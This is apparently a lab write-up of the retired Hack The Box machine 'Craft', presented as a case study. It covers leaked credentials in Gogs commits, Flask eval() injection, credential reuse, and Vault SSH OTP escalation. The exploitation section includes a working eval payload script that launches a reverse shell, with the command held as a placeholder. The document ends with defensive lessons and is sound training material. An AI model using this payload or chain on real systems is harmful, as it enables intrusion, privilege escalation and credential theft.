---
title: "HTB Craft — eval() Injection, Credential Reuse, and Vault SSH OTP"
description: "Leaked Gogs source exposes hardcoded API credentials and a Flask eval() call for container root; database credential reuse, a Gogs SSH key, and HashiCorp Vault SSH OTP then provide host root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - code-review
  - credential-reuse
  - hashicorp-vault
---

## Summary

Craft is a Medium Linux machine on Hack The Box. A Gogs instance leaks source code containing hardcoded API credentials and a dangerous Python `eval()` call in a Flask API. Exploiting the eval injection yields a root shell inside a Docker container. Post-exploitation reveals MySQL credentials whose users reuse passwords on Gogs, where an SSH private key grants host access. HashiCorp Vault's SSH one-time password feature then provides root on the host.

## Context and Objective

The target environment exposes standard SSH (port 22), an HTTPS nginx server (port 443), and a Golang SSH server (port 6022). The HTTPS server presents the domain `<TARGET_HOST>`. Virtual host enumeration reveals `api.<TARGET_HOST>`, `gogs.<TARGET_HOST>`, and `vault.<TARGET_HOST>`. All target-specific hostnames and IPs are replaced with placeholders throughout this document.

## Approach and Evidence

### Enumeration — Port Scanning

A fast TCP scan identified open ports and service versions:

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/craft-tcp
```

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
443/tcp open  ssl/http nginx 1.15.8
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
```

The SSL certificate reveals the domain `<TARGET_HOST>`.

### Enumeration — Web Application and Virtual Hosts

Visiting `https://<TARGET_HOST>/` shows an API description page for a craft-brew repository and references a Gogs instance at `gogs.<TARGET_HOST>`.

Virtual host enumeration discovers two additional subdomains:

```text
api.<TARGET_HOST>
vault.<TARGET_HOST>
```

### Source Code Review — Hardcoded Credentials

The Gogs instance hosts a `craft-api` repository. A specific commit diff exposes hardcoded API credentials in a plaintext authentication request:

```python
response = requests.get('https://api.<TARGET_HOST>/api/auth/login', auth=('<USER_1>', '<CRED_1>'), verify=False)
```

Using these credentials against the API endpoint returns a JSON Web Token:

```bash
curl -H "Content-Type: application/json" -k -X GET https://api.<TARGET_HOST>/api/auth/login -u '<USER_1>:<CRED_1>'
```

```json
{"token":"<JWT_TOKEN>"}
```

### Source Code Review — eval() Vulnerability

A subsequent commit introduces a dangerous `eval()` call in the brew creation endpoint:

```python
+        if eval('%s > 1' % request.json['abv']):
+            return "ABV must be a decimal value less than 1.0", 400
```

The `abv` parameter is interpolated directly into Python's `eval()` with no sanitization, enabling arbitrary code execution.

### Exploitation — eval() Remote Code Execution

An exploit authenticates to the API, retrieves a JWT token, and posts a malicious `abv` payload containing a reverse shell command to the brew creation endpoint:

```python
cmd = '__import__("os").system("<REVERSESHELL_COMMAND>")'
brew_dict = {"abv": cmd, "name": "test", "brewer": "test", "style": "test"}
headers = {"X-Craft-API-Token": token, "Content-Type": "application/json"}
response = requests.post("https://api.<TARGET_HOST>/api/brew/", headers=headers, data=json.dumps(brew_dict), verify=False)
```

The listener catches a reverse shell. The `id` command confirms root access inside a Docker container (hostname `<CONTAINER_ID>`).

### Post-Exploitation — Container Enumeration

The Flask application's configuration file in the container contains MySQL credentials:

```python
MYSQL_DATABASE_USER = '<DB_USER>'
MYSQL_DATABASE_PASSWORD = '<DB_PASSWORD>'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
```

Connecting to the database and querying the `user` table reveals three application accounts with stored passwords:

```text
[{'id': 1, 'username': '<USER_1>', 'password': '<CRED_1>'},
 {'id': 4, 'username': '<USER_2>', 'password': '<CRED_2>'},
 {'id': 5, 'username': '<USER_3>', 'password': '<CRED_3>'}]
```

The `<USER_3>` password matches the Gogs account password, indicating credential reuse.

### Post-Exploitation — Gogs Pivot and SSH Access

The `<USER_3>` credentials grant access to Gogs, where a private `craft-infra` repository contains an SSH private key. Using this key with the Gogs password as the passphrase provides a shell on the host:

```bash
ssh <USER_3>@<TARGET_HOST> -i <SSH_KEY_FILENAME>
```

### Privilege Escalation — Vault SSH OTP

From the `<USER_3>` session, HashiCorp Vault's SSH helper is available. Vault generates a one-time password for `root@127.0.0.1`:

```bash
vault ssh root@127.0.0.1
```

```text
OTP for the session is: <OTP_VALUE>
Password: <OTP_VALUE>
```

The OTP is accepted and a root shell is obtained on the host.

## Challenges and Decisions

- The Gogs source code review was the key step: identifying both leaked credentials and the `eval()` vulnerability required reading commit diffs rather than scanning endpoints.
- Credential reuse across MySQL, Gogs, and the SSH key passphrase was the pivot chain. Each service used the same `<USER_3>` password.
- Vault SSH OTP was an unconventional privilege escalation path. The `<USER_3>` user's Vault access granted OTP-based root sessions without needing a separate vulnerability.

## Outcome

The evidence establishes a complete attack chain: leaked API credentials from Gogs source control, `eval()` RCE in the Flask API yielding container root, MySQL credential discovery enabling Gogs access, SSH key recovery for host access, and Vault SSH OTP for host root. All stages are supported by source code review and command/output evidence from the notes.

## Lessons and Recommendations

- **Secrets in source control are immediate attack vectors.** Hardcoded credentials in a committed file provided initial access without any exploitation. Secrets management tools and pre-commit hooks prevent this class of vulnerability entirely.
- **`eval()` on untrusted input is never safe.** The ABV validation could have used a simple `float()` comparison. Replacing `eval()` with type-safe input validation eliminates the RCE.
- **Credential reuse amplifies impact.** A single leaked password became access to three distinct services. Enforcing unique credentials per service and using a secrets manager limits blast radius.
- **Vault SSH OTP requires strict access control.** The `<USER_3>` user should not have had Vault permissions to generate root OTPs. Restricting Vault SSH engine access to authorized administrative accounts prevents this escalation path.

## References

- Hack The Box retired lab — [Craft](https://app.hackthebox.com/machines/Craft)
